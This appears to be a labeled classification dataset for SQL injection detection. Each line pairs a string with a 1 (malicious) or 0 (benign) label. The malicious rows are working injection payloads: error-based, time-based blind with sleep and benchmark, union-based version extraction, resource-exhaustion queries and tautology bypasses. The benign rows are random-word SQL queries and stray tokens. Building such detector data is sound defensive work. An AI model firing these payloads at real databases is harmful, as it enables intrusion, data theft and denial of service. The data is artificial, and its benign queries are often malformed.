-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +';1
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo;1
"1""   )    )    as paep where 8947  =  8947 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --";1
1'   )    )     )   order by 1#;1
"admin"") or (""1""=""1";1
3902;0
INSERT INTO grow ( shall, kill, paragraph, spirit, recall, if )  VALUES  ( 'goose', 'speed'. spent', 'lesson', 'season', 'many', 'salmon' )  ;0
1'  )   as xhmm where 8092  =  8092 union all select null,null,null--;1
1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
salicilato;0
SELECT AVG ( done )  FROM ordinary  SELECT SUM ( closely ) ;0
"SELECT * FROM love WHERE pour BETWEEN ""period"" AND    ""full""";0
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv";1
"INSERT INTO products (description, user_id, email) VALUES (456, 'pending', 456);";0
SELECT * FROM divide WHERE NOT beyond = 'invented'  AND NOT handle = 'fellow';0
SELECT wind ( s )  FROM charge SELECT correctly ( s ) ;0
"1""   )    )    as xcyo where 2929  =  2929";1
)   or benchmark  (  10000000,MD5  (  1   )    )   #;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#;1
SELECT slope ( s )  FROM lying;0
3,62E+15;0
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #";1
invo3unta6i5;0
SELECT * FROM say WHERE triangle BETWEEN '1996-07-01' AND '1996-07-31';0
"1%"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""%""  =  """;1
SELECT magic,perfectly,its FROM discover LEFT JOIN Orders ON down.broadID =  happened.consist ORDER BY occur.save;0
1%'   )    )     )   and elt  (  7425  =  3843,3843  )   and    (    (     (  '%'  =  ';1
1' GROUP BY 1,2,3--+;1
SELECT TOP 3 * FROM chart WHERE can = 'west';0
"-4764""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dfvz"" like ""dfvz";1
60201082p;0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
4,11E+15;0
SELECT * FROM over WHERE market BETWEEN 'exact' AND 'specific';0
select * from users where id  =  '1' or .<$ union select 1,@@VERSION -- 1';1
SELECT TOP 50 PERCENT * FROM enter SELECT * FROM soldier FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM property;0
order by;1
SELECT TOP 50 PERCENT * FROM weigh;0
SELECT * FROM square WHERE aside NOT LIKE '[strange]%';0
6ong6;0
SELECT slope ( s )  FROM lying;0
"1""  )   and 2954  =  1256--";1
SELECT * FROM quite ORDER BY two, edge;0
select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1';1
SELECT shape ( s )  FROM jet FULL OUTER JOIN;0
"""""";1
-4340   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   8505  =  8505;1
1'  )   as rqzz where 4987  =  4987 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --;1
select sleep  (  5  )  #;1
SELECT * FROM universe WHERE clothes = 'catch' LIMIT 3;0
wyle@designworld.us;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)));1
select * from users where id  =  1 or <   =  1 or 1  =  1 -- 1;1
